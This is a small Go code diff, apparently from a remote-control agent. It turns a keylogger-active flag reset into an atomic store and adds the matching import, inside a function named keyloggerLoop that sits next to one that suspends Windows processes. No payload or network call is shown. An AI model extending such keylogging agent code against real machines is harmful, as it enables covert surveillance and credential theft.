@@ -14,6 +14,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"sync/atomic"
 	"time"
 )
 
@@ -148,7 +149,7 @@ func keyloggerLoop() {
 	if Debug {
 		fmt.Println("[*] Keylogger not supported on macOS agent yet")
 	}
-	keylogActive = false
+	atomic.StoreInt32(&keylogActive, 0)
 }
 
 func suspendProcessWindows(target string) (string, error) {
